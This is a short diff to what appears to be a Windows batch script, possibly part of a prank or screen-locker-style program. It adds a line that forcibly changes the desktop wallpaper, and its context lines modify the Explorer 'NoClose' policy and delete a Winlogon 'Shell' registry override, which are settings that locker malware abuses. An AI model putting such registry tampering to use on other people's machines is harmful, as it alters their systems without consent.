@@ -20,6 +20,7 @@ exit
 :init
 start calc
 start python\pythonw anticheat.py
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /d "%cd%\Untitled2.png"
 python\python skid.py
 reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 0 /f
 reg delete "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
